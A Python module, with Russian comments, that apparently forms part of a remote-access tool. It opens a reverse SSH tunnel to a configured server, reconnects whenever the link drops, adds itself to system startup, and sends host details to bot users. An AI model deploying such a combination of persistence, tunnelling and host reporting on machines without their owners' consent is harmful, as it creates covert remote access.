import paramiko
import asyncio

from controllers.botController import send_message_to_all_users
from helpers.autostart import add_to_startup
from helpers.get_used_ports import get_used_ports
from helpers.get_system_info import get_system_info

from config import server_config as conf
from config import system_data


class sshController:
    def __init__(self, username, password, server_ip, port=None, main_file_path=None):
        self.username = username
        self.password = password
        self.server_ip = server_ip
        self.client = None
        self.port = port

        self.credentials_ok = False
        self.main_file_path = main_file_path

    async def create_ssh_tunnel(self):
        self.client = paramiko.SSHClient()
        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        range_start = 5000
        range_end = 65000
        used_ports = get_used_ports(range_start, range_end)

        if self.port is None:
            for i in range(range_start, range_end):
                if not i in used_ports:
                    try:
                        print(f"Connecting to {self.server_ip}")
                        self.client.connect(hostname=self.server_ip, username=self.username, password=self.password,
                                            timeout=conf['timeout'])
                        print(f"Connected    to {self.server_ip}")
                        self.port = i  # Устанавливаем порт после успешного подключения

                        transport = self.client.get_transport()
                        transport.request_port_forward('', port=self.port)

                        channel = transport.open_channel(
                            "direct-tcpip",
                            (self.server_ip, self.port),
                            ("localhost", self.port)
                        )

                        self.credentials_ok = True
                        break
                    except Exception as e:
                        print(f"Connection failed on port {i}: {e}")

        else:
            try:
                print(f"Connecting to {self.server_ip}")
                self.client.connect(hostname=self.server_ip, username=self.username, password=self.password,
                                    timeout=conf['timeout'])
                print(f"Connected to {self.server_ip}")

                transport = self.client.get_transport()
                transport.request_port_forward('', port=self.port)

                channel = transport.open_channel(
                    "direct-tcpip",
                    (self.server_ip, self.port),
                    ("localhost", self.port)
                )

                self.credentials_ok = True
            except Exception as e:
                print(f"Connection failed: {e}")

    async def monitor_connection(self):
        while True:
            if self.credentials_ok:
                try:
                    stdin, stdout, stderr = self.client.exec_command('echo "ping"')
                    print(stdout.read())
                    await asyncio.sleep(15)  # Интервал проверки

                except Exception as e:
                    print(f"Connection lost: {e}. Reconnecting...")
                    await self.create_ssh_tunnel()
                    continue

    async def start(self):
        await self.create_ssh_tunnel()
        task = asyncio.create_task(self.monitor_connection())

        system_info = await get_system_info()

        if system_info:
            system_data['last_message'] = f"""Подключение успешно установлено!
Пользователь: {self.username}
IP: {self.server_ip}
Порт: {self.port}

Системная информация:
{system_info}

Автозагрузка:
{add_to_startup(self.main_file_path)}
"""

            send_message_to_all_users(system_data['last_message'])

        await task
